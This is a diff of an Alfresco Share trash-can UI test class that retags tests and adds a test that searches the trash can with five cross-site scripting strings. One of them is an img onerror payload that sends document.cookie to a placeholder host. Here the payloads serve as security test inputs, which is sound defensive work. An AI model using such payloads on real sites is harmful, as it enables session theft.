@@ -20,7 +20,6 @@ package org.alfresco.share.user.trashcan;
 
 import java.util.List;
 
-import org.alfresco.po.share.SharePopup;
 import org.alfresco.po.share.enums.UserRole;
 import org.alfresco.po.share.exception.ShareException;
 import org.alfresco.po.share.site.DestinationAndAssigneeBean;
@@ -54,7 +53,6 @@ import org.testng.annotations.Test;
  * @author nshah
  */
 @Listeners(FailedTestListener.class)
-
 public class TrashCanTest extends AbstractCloudSyncTest
 {
 
@@ -86,7 +84,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         testName = this.getClass().getSimpleName();
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10449() throws Exception
     {
         String testName = getTestName();
@@ -103,7 +101,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10449() throws Exception
     {
         String testName = getTestName();
@@ -148,7 +146,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10457() throws Exception
     {
         String testName = getTestName();
@@ -180,7 +178,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10457() throws Exception
     {
         String testName = getTestName();
@@ -206,7 +204,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10450() throws Exception
     {
 
@@ -223,7 +221,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10450() throws Exception
     {
         String testName = getTestName();
@@ -285,7 +283,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         Assert.assertTrue(itemInfo.getUserFullName().startsWith(trashcanUser));
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10458() throws Exception
     {
         String testName = getTestName();
@@ -304,7 +302,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
     /**
      * ALF_10458
      */
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10458() throws Exception
     {
         String testName = getTestName();
@@ -382,7 +380,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         Assert.assertNotNull(trashCanItem);
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10459() throws Exception
     {
         String testName = getTestName();
@@ -401,7 +399,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
     /**
      * ALF_10459
      */
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10459() throws Exception
     {
         // dataPrep_TrashCan_ALF_10459(drone);
@@ -486,7 +484,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15261() throws Exception
     {
         String testName = getTestName();
@@ -502,7 +500,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15261() throws Exception
     {
         // dataPrep_TrashCan_ALF_15261(drone);
@@ -561,7 +559,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15262() throws Exception
     {
 
@@ -570,7 +568,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15262() throws Exception
     {
         // dataPrep_TrashCan_ALF_15262(drone);
@@ -633,7 +631,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15263() throws Exception
     {
 
@@ -643,7 +641,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15263() throws Exception
     {
         String testName = getTestName();
@@ -699,7 +697,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10460() throws Exception
     {
 
@@ -709,7 +707,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10460() throws Exception
     {
         // dataPrep_TrashCan_ALF_10460(drone);
@@ -764,7 +762,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10461() throws Exception
     {
         String testName = getTestName();
@@ -782,7 +780,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10461() throws Exception
     {
         // dataPrep_TrashCan_ALF_10461(drone);
@@ -830,7 +828,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10462() throws Exception
     {
         String testName = getTestName();
@@ -869,7 +867,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10462() throws Exception
     {
         String testName = getTestName();
@@ -902,7 +900,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10463() throws Exception
     {
 
@@ -940,7 +938,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10463() throws Exception
     {
         // dataPrep_TrashCan_ALF_10463(drone);
@@ -997,7 +995,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10464() throws Exception
     {
 
@@ -1031,7 +1029,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10464() throws Exception
     {
 
@@ -1057,7 +1055,79 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
+    public void dataPrep_TrashCan_ALF_10465() throws Exception
+    {
+        String testName = getTestName();
+        String siteName1 = getSiteName(testName);
+
+        String testUser = getUserNameForDomain(testName, testDomainFree);
+
+        String fileName1 = "fi1-" + getFileName(testName);
+        String fileName2 = "fi2-" + getFileName(testName);
+
+        String folderName1 = "fo3-" + getFolderName(testName);
+        String folderName2 = "fo4-" + getFolderName(testName);
+
+        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });
+        
+        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
+        
+        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
+        
+        ShareUser.openSitesDocumentLibrary(drone, siteName1);
+        
+        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
+        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });
+        
+        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
+        ShareUserSitePage.createFolder(drone, folderName2, folderName2);
+
+        ShareUser.selectContentCheckBox(drone, fileName1);
+        ShareUser.selectContentCheckBox(drone, fileName2);
+        ShareUser.selectContentCheckBox(drone, folderName1);
+        ShareUser.selectContentCheckBox(drone, folderName2);
+
+        ShareUser.deleteSelectedContent(drone);
+
+        ShareUser.logout(drone);
+    }
+
+    @Test(groups = { "TrashCan" })
+    public void ALF_10465() throws Exception
+    {
+        String testName = getTestName();
+        String trashcanUser1 = getUserNameForDomain(testName, testDomainFree);
+
+        String XSS_STRING_1 = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
+        String XSS_STRING_2 = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
+        String XSS_STRING_3 = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
+        String XSS_STRING_4 = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
+        String XSS_STRING_5 = "<img><scrip<script>t>alert('XSS');<</script>/script>";
+
+        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
+
+        ShareUserProfile.navigateToTrashCan(drone);
+
+        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_1);
+        Assert.assertTrue(nameOfItems.isEmpty());
+
+        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_2);
+        Assert.assertTrue(nameOfItems.isEmpty());
+
+        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_3);
+        Assert.assertTrue(nameOfItems.isEmpty());
+
+        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_4);
+        Assert.assertTrue(nameOfItems.isEmpty());
+
+        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_5);
+        Assert.assertTrue(nameOfItems.isEmpty());
+
+        ShareUser.logout(drone);
+    }
+
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_10468() throws Exception
     {
 
@@ -1091,7 +1161,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_10468() throws Exception
     {
         String testName = getTestName();
@@ -1127,7 +1197,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15279() throws Exception
     {
 
@@ -1142,7 +1212,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15279() throws Exception
     {
         String testName = getTestName();
@@ -1192,7 +1262,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15280() throws Exception
     {
 
@@ -1208,7 +1278,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15280() throws Exception
     {
 
@@ -1305,7 +1375,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15281() throws Exception
     {
 
@@ -1321,7 +1391,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15281() throws Exception
     {
         String testName = getTestName();
@@ -1384,7 +1454,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+  @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15282() throws Exception
     {
 
@@ -1393,7 +1463,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15282() throws Exception
     {
 
@@ -1437,10 +1507,10 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         ShareUserProfile.deleteTrashCanItem(drone, siteName1);
 
-        Assert.assertFalse(SiteUtil.searchSite(drone, siteName1).getSiteList().contains(siteName1));
+        Assert.assertFalse(SiteUtil.searchSiteWithRetry(drone, siteName1, false).getSiteList().contains(siteName1));
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+   @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15277() throws Exception
     {
 
@@ -1461,7 +1531,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15277() throws Exception
     {
         String testName = getTestName();
@@ -1509,7 +1579,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan"})
+     @Test(groups = { "DataPrepTrashCan"})
     public void dataPrep_TrashCan_ALF_15278() throws Exception
     {
         String testName = getTestName();
@@ -1531,14 +1601,14 @@ public class TrashCanTest extends AbstractCloudSyncTest
         ShareUser.logout(drone);
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15278() throws Exception
     {
         String testName = getTestName();
 
         String testUser1 = getUserNameForDomain(testName + "1", testDomainFree);
         String testUser2 = getUserNameForDomain(testName + "2", testDomainFree);
-        String testUser3 = getUserNameForDomain(testName + "3", testDomainFree);
+       
 
         String siteName1 = getSiteName(testName);
 
@@ -1552,7 +1622,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         
         ShareUserSitePage.manageContentPermissions(drone, folderName);
         
-        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, false);
+        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, true);
 
         ShareUser.openSitesDocumentLibrary(drone, siteName1);
 
@@ -1577,21 +1647,21 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         DocumentLibraryPage docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);
 
-        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isInlineEditLinkPresent());
+        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isEditPropertiesLinkPresent());
 
         ShareUser.logout(drone);
 
-        // Checks for Group: Collaborator
-        ShareUser.login(drone, testUser3, DEFAULT_PASSWORD);
-
-        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);
-
-        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isSyncToCloudLinkPresent());
-
-        ShareUser.logout(drone);
+//        // Checks for Group: Collaborator
+//        ShareUser.login(drone, testUser3, DEFAULT_PASSWORD);
+//
+//        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);
+//
+//        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isSyncToCloudLinkPresent());
+//
+//        ShareUser.logout(drone);
     }
 
-    @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
+     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
     public void dataPrep_TrashCan_ALF_15273() throws Exception
     {
         String testName = getTestName();
@@ -1664,7 +1734,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);
 
-        DocumentLibraryPage docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);
+        DocumentLibraryPage docLibPage = ShareUser.openSitesDocumentLibrary(hybridDrone, cloudSiteName);
 
         Assert.assertFalse(docLibPage.isFileVisible(file));
 
@@ -1680,7 +1750,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, file));
 
-        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, opSiteName);
+        docLibPage = ShareUser.openSitesDocumentLibrary(drone, opSiteName);
 
         docLibPage.isFileVisible(file);
 
@@ -1692,17 +1762,17 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);
 
-        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(hybridDrone, cloudSiteName);
+        docLibPage = ShareUser.openSitesDocumentLibrary(hybridDrone, cloudSiteName);        
 
+        Assert.assertTrue(AbstractCloudSyncTest.checkIfContentIsSynced(hybridDrone, file));
+        
         Assert.assertTrue(docLibPage.isFileVisible(file));
-
-        Assert.assertTrue(docLibPage.getFileDirectoryInfo(file).isCloudSynced());
 
         ShareUser.logout(hybridDrone);
 
     }
 
-    @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
+     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
     public void dataPrep_TrashCan_ALF_15274() throws Exception
     {
         String testName = getTestName();
@@ -1815,7 +1885,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
+     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
     public void dataPrep_TrashCan_ALF_15275() throws Exception
     {
         String testName = getTestName();
@@ -1835,20 +1905,16 @@ public class TrashCanTest extends AbstractCloudSyncTest
         CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
         CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");
 
-        // Login to User1, set up the cloud sync
+        // Login to User1, create site, set up the cloud sync
         ShareUser.login(drone, user1, DEFAULT_PASSWORD);
         signInToAlfrescoInTheCloud(drone, cloudUser, DEFAULT_PASSWORD);
+        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
+       
         ShareUser.logout(drone);
 
         ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);
         ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);
         ShareUser.logout(hybridDrone);
-
-        // Login as Enterprise user, create site
-        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
-        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
-        ShareUser.logout(drone);
-
     }
 
     @Test(groups = {"HybridSync", "Enterprise42" })
@@ -1917,7 +1983,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
+     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
     public void dataPrep_TrashCan_ALF_15276() throws Exception
     {
         String testName = getTestName();
@@ -1937,20 +2003,15 @@ public class TrashCanTest extends AbstractCloudSyncTest
         CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
         CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");
 
-        // Login to User1, set up the cloud sync
+        // Login to User1, create site, set up the cloud sync
         ShareUser.login(drone, user1, DEFAULT_PASSWORD);
+        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
         signInToAlfrescoInTheCloud(drone, user1, DEFAULT_PASSWORD);
         ShareUser.logout(drone);
 
         ShareUser.login(hybridDrone, cloudUser, DEFAULT_PASSWORD);
         ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);
         ShareUser.logout(hybridDrone);
-
-        // Login as Enterprise user, create site
-        ShareUser.login(drone, user1, DEFAULT_PASSWORD);
-        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);
-        ShareUser.logout(drone);
-
     }
 
     @Test(groups = { "HybridSync", "Enterprise42" })
@@ -2016,7 +2077,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
     }
 
-    @Test(groups = { "DataPrepTrashCan" })
+   @Test(groups = { "DataPrepTrashCan" }) 
     public void dataPrep_TrashCan_ALF_15285() throws Exception
     {
 
@@ -2025,7 +2086,7 @@ public class TrashCanTest extends AbstractCloudSyncTest
         CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
     }
 
-    @Test
+    @Test(groups = { "TrashCan" })
     public void ALF_15285() throws Exception
     {
 
@@ -2054,16 +2115,15 @@ public class TrashCanTest extends AbstractCloudSyncTest
 
         ShareUserProfile.navigateToTrashCan(drone);
         
-        SharePopup errorPopup = (SharePopup)ShareUserProfile.recoverTrashCanItem(drone, fileName);       
         try
         {
-            errorPopup.handleMessage();
+            ShareUserProfile.recoverTrashCanItem(drone, fileName).render();
+            Assert.fail("Expected error: Failed to recover: is not displayed");
         }
         catch(ShareException se)
-        {
+        {                    
             //Continue On Expected Exception
-            Assert.assertTrue(("Failed to recover " + fileName).equalsIgnoreCase(se.getMessage()));
-            //drone.refresh();
+            Assert.assertTrue(("Failed to recover").equalsIgnoreCase(se.getMessage()));
         }
                
         Assert.assertTrue(StringUtils.isEmpty(ShareUserProfile.getTrashCanItem(drone, folder).getFolderPath()));      
